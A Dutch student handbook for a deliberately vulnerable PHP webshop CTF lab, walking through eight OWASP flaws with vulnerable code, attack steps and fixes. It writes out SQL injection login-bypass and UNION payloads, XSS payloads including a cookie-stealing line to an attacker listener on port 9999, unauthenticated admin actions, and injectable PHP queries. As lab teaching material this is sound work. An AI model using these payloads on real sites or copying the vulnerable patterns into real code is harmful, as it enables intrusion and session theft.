# TechShop Security Lab — Studentenhandleiding

---

## Wat ga je leren?

In deze opdracht onderzoek je een **opzettelijk onveilige webshop**. Je leert:

- Hoe veelvoorkomende beveiligingslekken eruitzien in echte code
- Hoe een aanvaller deze lekken kan misbruiken
- Hoe je ze kunt oplossen

De lekken zijn gebaseerd op de **OWASP Top 10** — de officiële lijst van de meest voorkomende kwetsbaarheden in webapplicaties, gebruikt door security-professionals wereldwijd.

---

## Installatie

### Wat heb je nodig?
- **PHP 8.x** — check met `php --version` in je terminal
- Een webbrowser (Chrome of Firefox)
- Geen XAMPP, geen MySQL, geen extra software nodig

### Opstarten
1. Open een terminal in de projectmap
2. Typ:
   ```
   php -S localhost:8080
   ```
3. Open je browser op **http://localhost:8080**

De database (`webshop.db`) wordt automatisch aangemaakt bij de eerste keer.

> **Poort bezet?** Gebruik dan: `php -S localhost:8181` en vervang 8080 door 8181 in alle URLs hieronder.

---

## Testaccounts

| Gebruikersnaam | Wachtwoord | Rol           |
|---------------|-----------|---------------|
| admin         | admin123  | Beheerder     |
| john          | password  | Gebruiker     |
| jane          | 123456    | Gebruiker     |
| test          | test      | Gebruiker     |

---

## De CTF — Capture The Flag

Dit project werkt als een **CTF (Capture The Flag)**. Bij elk beveiligingslek is een geheime vlag verstopt. Een vlag ziet er zo uit:

```
FLAG{dit_is_een_voorbeeld}
```

### Hoe werkt het?
1. Ga naar **http://localhost:8080/ctf.php**
2. Kies een uitdaging
3. Exploiteer het bijbehorende beveiligingslek
4. Vind de vlag (die verschijnt ergens op de pagina of in de broncode)
5. Lever de vlag in op de CTF-pagina met jouw naam
6. Bekijk het **scorebord** — wie heeft de meeste vlaggen?

> De CTF-pagina heeft ook hints per uitdaging als je vastloopt.

---

## Opdracht 1 — SQL Injection: Login Bypass
**OWASP A03:2021 – Injection | Beginner**

### Wat is het?
De inlogpagina bouwt een SQL-query op door de gebruikersnaam en het wachtwoord er direct in te plakken. Als een aanvaller speciale tekens invoert, kan hij de query aanpassen en inloggen zonder het juiste wachtwoord te kennen.

### De kwetsbare code (`login.php` regel 14)
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

### CTF-doel
Log in als de geheime gebruiker **`geheim`** zonder zijn wachtwoord te kennen. De vlag verschijnt zodra je succesvol bent ingelogd.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/login.php**
2. Vul bij **Gebruikersnaam** in: `geheim' --`
3. Laat **Wachtwoord** leeg (of vul iets willekeurigs in)
4. Klik op **Inloggen**
5. Resultaat: je bent ingelogd als `geheim` — de vlag verschijnt

### Waarom werkt dit?
De query wordt na jouw invoer:
```sql
SELECT * FROM users WHERE username = 'geheim' --' AND password = ''
```
De `--` is een SQL-commentaarteken. Alles erna (inclusief de wachtwoordcheck) wordt genegeerd. De database vindt de gebruiker `geheim` en logt je in.

### Oplossing
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```
Met **prepared statements** worden de invoerwaardes apart van de query verwerkt — SQL-injectie is dan onmogelijk.

---

## Opdracht 2 — SQL Injection: Data Stelen (UNION Attack)
**OWASP A03:2021 – Injection | Gemiddeld**

### Wat is het?
De zoekfunctie plakt de zoekterm ook direct in een SQL-query. Met een `UNION SELECT` kun je een tweede query toevoegen die data uit een andere tabel ophaalt — inclusief tabellen die normaal verborgen zijn.

### De kwetsbare code (`products.php` regel 11)
```php
$query = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
```

### CTF-doel
Er bestaat een geheime tabel genaamd **`geheimen`** in de database. Haal de inhoud op via de zoekbalk. De vlag staat in die tabel.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/products.php**
2. Typ in het zoekveld:
   ```
   %' UNION SELECT geheim, inhoud, inhoud, inhoud, inhoud, inhoud, inhoud FROM geheimen --
   ```
3. Klik op **Zoeken**
4. Resultaat: de inhoud van de geheimentabel verschijnt in de productenlijst

> **Tip:** De products-tabel heeft 7 kolommen. Je UNION SELECT moet ook 7 kolommen teruggeven.

### Waarom werkt dit?
`UNION` voegt een tweede SELECT toe aan de query. De database voert beide queries uit en combineert de resultaten. Zo kun je elke tabel uitlezen waar je de naam van weet.

### Oplossing
```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ? OR description LIKE ?");
$stmt->execute(["%$search%", "%$search%"]);
```

---

## Opdracht 3 — Broken Access Control: Admin zonder Inloggen
**OWASP A01:2021 – Broken Access Control | Beginner**

### Wat is het?
Het admin-paneel controleert nergens of je wel ingelogd bent of beheerdersrechten hebt. Iedereen die de URL kent, heeft volledige toegang.

### De kwetsbare code (`admin.php` regel 1-6)
```php
<?php
$page_title = "Admin Panel - TechShop";
// ... hier staat GEEN enkele authenticatiecheck
```

### CTF-doel
Bezoek het admin-paneel zonder ingelogd te zijn. De vlag staat zichtbaar op de pagina.

### Aanval — stap voor stap
1. Zorg dat je **niet** ingelogd bent (log uit, of open een incognitovenster)
2. Ga rechtstreeks naar **http://localhost:8080/admin.php**
3. Resultaat: je ziet het volledige admin-dashboard met alle gebruikers en wachtwoorden
4. De vlag staat op de pagina

**Bonus:** Probeer ook deze URL's (zonder ingelogd te zijn):
```
http://localhost:8080/admin.php?action=reset_passwords
http://localhost:8080/admin.php?action=delete_all_comments
```

### Waarom werkt dit?
Er staat geen code die controleert wie de pagina opent. Elke URL is publiek toegankelijk.

### Oplossing
Voeg dit bovenaan `admin.php` toe:
```php
if (!isLoggedIn() || !isAdmin()) {
    header("Location: login.php");
    exit();
}
```

---

## Opdracht 4 — Sensitive Data Exposure: Wachtwoorden in Plaintext
**OWASP A02:2021 – Cryptographic Failures | Beginner**

### Wat is het?
Wachtwoorden worden niet versleuteld (gehashed) opgeslagen in de database. In het admin-paneel zijn ze gewoon leesbaar. Als de database ooit gestolen wordt, heeft een aanvaller direct toegang tot alle accounts.

### CTF-doel
Er is een gebruiker waarvan het wachtwoord zelf de vlag is. Zoek hem op in het admin-paneel.

### Aanval — stap voor stap
1. Log in als **admin** / **admin123**
2. Ga naar **http://localhost:8080/admin.php**
3. Kijk naar de kolom **Wachtwoord** in de gebruikerstabel
4. Eén van de wachtwoorden is de vlag

**Bonus — SQL debug:**
1. Ga naar **http://localhost:8080/login.php?debug_sql=1**
2. Probeer in te loggen
3. Resultaat: de volledige SQL-query inclusief je wachtwoord verschijnt op de pagina

### Waarom is dit gevaarlijk?
- Plaintext wachtwoorden zijn direct bruikbaar na een datalek
- Veel mensen hergebruiken wachtwoorden op meerdere sites

### Oplossing
```php
// Bij registratie — sla altijd een hash op:
$hashed = password_hash($password, PASSWORD_BCRYPT);

// Bij inloggen — vergelijk met de hash:
if (password_verify($input_password, $user['password'])) {
    // inloggen geslaagd
}
```

---

## Opdracht 5 — Stored XSS: Kwaadaardige Review
**OWASP A03:2021 – Injection (XSS) | Gemiddeld**

### Wat is het?
Reviews worden zonder controle opgeslagen en daarna direct als HTML op de pagina geplaatst. Een aanvaller kan JavaScript in een review zetten. Die code wordt vervolgens uitgevoerd bij **iedereen** die de pagina bezoekt.

### De kwetsbare code (`product.php`)
```php
<?php echo $comment['comment']; ?>  // GEEN htmlspecialchars!
```

### CTF-doel
Er zit een speciale CTF-cookie in je browser. Gebruik een XSS-payload in een review om de inhoud van `document.cookie` zichtbaar te maken. De vlag staat in die cookie.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/product.php?id=1**
2. Scroll naar het reviewformulier
3. Vul bij **Naam** in: `Hacker`
4. Vul bij **Review** in:
   ```html
   <script>alert(document.cookie)</script>
   ```
5. Klik **Verstuur Review**
6. Resultaat: een popup verschijnt met de cookie-inhoud — daarin staat de vlag

**Geavanceerde aanval:**
```html
<script>new Image().src='http://localhost:9999/?c='+document.cookie</script>
```
Elke bezoeker stuurt nu onbewust zijn cookie naar de aanvaller (als die een server op poort 9999 draait).

### Waarom is dit gevaarlijk?
Dit is **Stored XSS**: de kwaadaardige code wordt één keer opgeslagen maar treft alle toekomstige bezoekers. Het kan gebruikt worden om sessies te kapen of bezoekers om te leiden.

### Oplossing
```php
echo htmlspecialchars($comment['comment'], ENT_QUOTES, 'UTF-8');
```
`htmlspecialchars()` zet `<` om naar `&lt;` en `>` naar `&gt;` — de browser toont het als tekst, niet als HTML.

---

## Opdracht 6 — Reflected XSS: Zoekterm in Pagina
**OWASP A03:2021 – Injection (XSS) | Gemiddeld**

### Wat is het?
De zoekterm uit de URL wordt direct in de HTML van de pagina gezet, zonder te controleren of er gevaarlijke tekens in zitten. Een aanvaller kan een link maken met een XSS-payload erin — iedereen die op die link klikt, voert de code uit.

### De kwetsbare code (`products.php`)
```php
<?php echo $search ? "Zoekresultaten voor: " . $search : "Alle Producten"; ?>
```

### CTF-doel
De vlag staat verborgen in de HTML-broncode van de zoekpagina. Bekijk de broncode nadat je een zoekopdracht hebt gedaan.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/products.php** en zoek op iets (bijv. `laptop`)
2. Druk op **Ctrl+U** om de HTML-broncode te bekijken
3. Zoek in de broncode naar `CTF` of `FLAG` (gebruik Ctrl+F)
4. De vlag staat er als HTML-commentaar in

**Demonstratie van de XSS:**
```
http://localhost:8080/products.php?search=<script>alert('XSS werkt!')</script>
```

**Phishing demonstratie:**
```
http://localhost:8080/products.php?search=<div style="background:red;color:white;padding:20px">JE ACCOUNT IS GEHACKT!</div>
```

### Oplossing
```php
echo $search ? "Zoekresultaten voor: " . htmlspecialchars($search, ENT_QUOTES, 'UTF-8') : "Alle Producten";
```

---

## Opdracht 7 — IDOR: Verborgen Product
**OWASP A01:2021 – Broken Access Control | Gemiddeld**

### Wat is het?
IDOR staat voor **Insecure Direct Object Reference**. De applicatie geeft toegang tot objecten (zoals producten) puur op basis van een ID in de URL, zonder te controleren of je die ook mag zien. Zo kun je door ID's te proberen data bereiken die verborgen hoort te zijn.

### De kwetsbare code (`product.php` regel 7)
```php
$product_id = $_GET['id'] ?? 1;  // geen validatie, geen autorisatiecheck
$query = "SELECT * FROM products WHERE id = $product_id";
```

### CTF-doel
Er bestaat een geheim product dat **niet** in de normale productenlijst staat. Manipuleer het product-ID in de URL om het te vinden. De vlag staat in de beschrijving van dat product.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/product.php?id=1** — dit is een normaal product
2. Probeer hogere ID's: `?id=2`, `?id=3`, `?id=10`, `?id=99`...
3. Op een gegeven moment stuit je op het geheime product
4. De vlag staat in de productbeschrijving

### Waarom werkt dit?
Er is geen controle of het product publiek zichtbaar mag zijn. Als je het ID weet (of raadt), zie je het product.

### Oplossing
```php
// Controleer of het product ook publiek beschikbaar is:
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ? AND is_public = 1");
$stmt->execute([$product_id]);
```

---

## Opdracht 8 — Input Validatie: Wachtwoord Zichtbaar
**OWASP A04:2021 – Insecure Design | Beginner**

### Wat is het?
Het registratieformulier heeft twee fouten: het wachtwoordveld is van het type `text` (in plaats van `password`), dus het wachtwoord is zichtbaar tijdens het typen. Bovendien worden er geen eisen gesteld aan het wachtwoord of het e-mailadres — alles wordt geaccepteerd.

### De kwetsbare code (`register.php` regel 72)
```html
<input type="text" id="password" name="password" placeholder="Kies een sterk wachtwoord">
```

### CTF-doel
Registreer een nieuw account met een ongeldig e-mailadres (geen geldig e-mailformaat). Als de registratie slaagt, ontvang je de vlag.

### Aanval — stap voor stap
1. Ga naar **http://localhost:8080/register.php**
2. Klik op het wachtwoordveld — het wachtwoord is zichtbaar als gewone tekst (geen sterretjes!)
3. Registreer met:
   - Gebruikersnaam: `test2`
   - E-mail: `geen-email` (geen geldig formaat)
   - Wachtwoord: `a` (slechts één teken)
4. Resultaat: het account wordt aangemaakt en de vlag verschijnt

### Waarom is dit gevaarlijk?
- Zichtbaar wachtwoord: iemand die meekijkt ziet het direct
- Geen e-mailvalidatie: nep-accounts zijn eenvoudig aan te maken
- Geen wachtwoordvereisten: gebruikers kiezen extreem zwakke wachtwoorden

### Oplossing
```html
<!-- HTML: gebruik de juiste input types -->
<input type="password" id="password" name="password">
<input type="email" id="email" name="email">
```
```php
// PHP: valideer altijd ook server-side
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $error = "Voer een geldig e-mailadres in";
}
if (strlen($password) < 8) {
    $error = "Wachtwoord moet minimaal 8 tekens bevatten";
}
```

---

## Samenvatting

| # | Lek | CTF-doel | Pagina | Niveau |
|---|-----|---------|--------|--------|
| 1 | SQL Injection — Login Bypass | Inloggen als gebruiker `geheim` | /login.php | Beginner |
| 2 | SQL Injection — UNION Attack | Geheimentabel uitlezen | /products.php | Gemiddeld |
| 3 | Broken Access Control | Admin-paneel zonder inloggen bezoeken | /admin.php | Beginner |
| 4 | Sensitive Data Exposure | Wachtwoord-als-vlag vinden | /admin.php | Beginner |
| 5 | Stored XSS | CTF-cookie uitlezen via review | /product.php?id=1 | Gemiddeld |
| 6 | Reflected XSS | Vlag in HTML-broncode vinden | /products.php | Gemiddeld |
| 7 | IDOR | Verborgen product vinden via ID | /product.php | Gemiddeld |
| 8 | Input Validatie | Registreren met ongeldig e-mailadres | /register.php | Beginner |

---

## Veelgestelde vragen

**De database is leeg of er zijn geen producten?**
Verwijder het bestand `webshop.db` en herstart de server. De database wordt opnieuw aangemaakt.

**Mijn XSS-payload werkt niet?**
Gebruik Chrome — Firefox blokkeert sommige XSS-aanvallen automatisch.

**Ik zie de vlag niet na de SQL-injection?**
Controleer of je exact de juiste payload gebruikt. Let op aanhalingstekens en spaties.

**De server geeft een foutmelding?**
Controleer of je PHP 8.x gebruikt (`php --version`) en of je in de juiste map staat.

**Wat is OWASP?**
OWASP (Open Worldwide Application Security Project) is een internationale non-profit organisatie die richtlijnen maakt voor webbeveiliging. De OWASP Top 10 is de standaardlijst van de meest kritieke beveiligingsrisico's voor webapplicaties — gebruikt door bedrijven wereldwijd.

---

## Ethische disclaimer

De technieken in deze handleiding zijn uitsluitend bedoeld voor:
- Educatieve doeleinden binnen de opleiding
- Het beveiligen van je eigen applicaties
- Security audits waarbij je toestemming hebt van de eigenaar

**Gebruik deze kennis NOOIT voor ongeautoriseerde toegang tot systemen van anderen. Dit is strafbaar.**
